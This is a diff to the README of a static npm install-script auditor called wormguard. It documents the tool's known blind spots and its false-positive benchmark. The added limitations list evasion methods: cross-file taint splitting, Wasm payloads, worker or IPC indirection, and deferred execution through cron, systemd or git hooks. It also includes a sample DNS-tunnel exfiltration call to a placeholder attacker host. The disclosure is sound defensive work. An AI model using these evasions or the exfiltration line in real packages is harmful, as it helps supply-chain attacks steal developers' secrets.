@@ -85,6 +85,27 @@ packages and has not been tuned to evade any specific tool. It is
   is detected if the AST hits the malicious branch. Static analysis
   has no notion of `Date.now()` returning anything; the malicious
   branch is always reachable to me.
+- **Cross-file / cross-function taint** — the taint approximation is
+  intra-procedural and largely intra-file. `const t = process.env.SECRET`
+  in one module and `fetch(url, t)` in another (or in a callee I do not
+  inline) are not connected. Splitting the source and the sink across
+  files is a reliable evasion.
+- **WebAssembly payloads** — a script that does
+  `WebAssembly.instantiate(bytes)` executes logic I never see; I parse
+  JavaScript ASTs, not Wasm bytecode.
+- **DNS-tunnel exfiltration** — `dns.resolve('<base64-secret>.attacker.tld')`
+  leaks data in the queried hostname. I flag use of the `dns` builtin but
+  do not decode the tunneled payload, and a userland resolver evades even
+  that.
+- **Worker / IPC indirection** — moving the act into a `worker_threads`
+  worker, a `child_process.fork()`, or another process reached over an
+  IPC/socket splits the behaviour across processes I analyse
+  independently.
+- **Write-now, execute-later** — a script that only writes a file (a
+  `cron`/`systemd` unit, a shell-rc line, a git hook) and exits is, at
+  scan time, just a filesystem write (`WG-AST-FS-WRITE`, medium). The
+  execution happens out of band, after the scan, invisible to an
+  install-time static auditor.
 - **The threat model assumes the rules are public.** They are. An
   attacker that knows the rule list can construct a payload that hits
   no rule. This is the structural limit of any heuristic-based detector
@@ -97,6 +118,22 @@ packages and has not been tuned to evade any specific tool. It is
 If your threat model includes targeted attackers who have specifically
 prepared a payload to evade wormguard, you need runtime sandboxing.
 This tool does not provide that.
+
+### False positives (measured, not asserted)
+
+`wormguard` targets **zero CI-gating (critical/high) false positives on
+legitimate code**, and that target is measured. Against a 662-package tree
+of popular dependencies the current rules produce **0 critical/high** and a
+small number of `medium` informational findings. Full methodology,
+before/after numbers, the root causes of the false positives that were
+fixed, and the honest residual caveats are in
+[`docs/false-positive-baseline.md`](docs/false-positive-baseline.md).
+Reproduce on your own tree with `bun run scripts/fp-benchmark.ts`.
+
+The fuzzy `WG-IOC-NEAR` rule is intentionally `medium`, not `high`: it is a
+name-*proximity* heuristic, so a mid-popularity package one edit from a
+known-malicious name can still surface there for manual triage. The exact
+corpus match (`WG-IOC-NAME`) remains `critical`.
 
 ## Where it fits
 
